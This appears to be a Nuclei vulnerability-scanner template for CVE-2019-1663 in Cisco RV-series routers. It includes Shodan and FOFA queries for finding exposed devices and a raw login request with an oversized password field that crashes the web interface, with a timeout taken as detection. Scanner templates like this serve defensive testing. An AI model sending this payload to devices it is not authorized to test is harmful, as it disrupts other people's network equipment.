id: CVE-2019-1663

info:
  name: Cisco RV Series Routers - Remote Command Execution
  author: princechaddha
  severity: critical
  description: |
    A vulnerability in the web-based management interface of Cisco RV110W, RV130W, and RV215W routers could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device. The vulnerability is due to improper validation of user-supplied data in the web-based management interface. An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device. This template attempts to trigger a denial of service, which may temporarily disrupt the device's web interface.
  reference:
    - https://www.exploit-db.com/exploits/46705/
    - https://github.com/WolffCorentin/CVE-2019-1663-Binary-Analysis
    - https://github.com/StealYourCode/CVE-2019-1663
    - http://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv130_rmi_rce
    - https://nvd.nist.gov/vuln/detail/CVE-2019-1663
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-1663
    cwe-id: CWE-120
  metadata:
    shodan-query: http.favicon.hash:"-646322113"
    fofa-query: icon_hash="-646322113"
  tags: cve,cve2019,cisco,rce,unauth,dos

http:
  - raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        submit_button=login&submit_type=&gui_action=&wait_time=0&change_action=&enc=0&user=user&pwd={{rand_text_alpha(2000)}}&sel_lang=EN

    read-timeout: 10
    matchers:
      - type: dsl
        dsl:
          - 'is_timedout()'
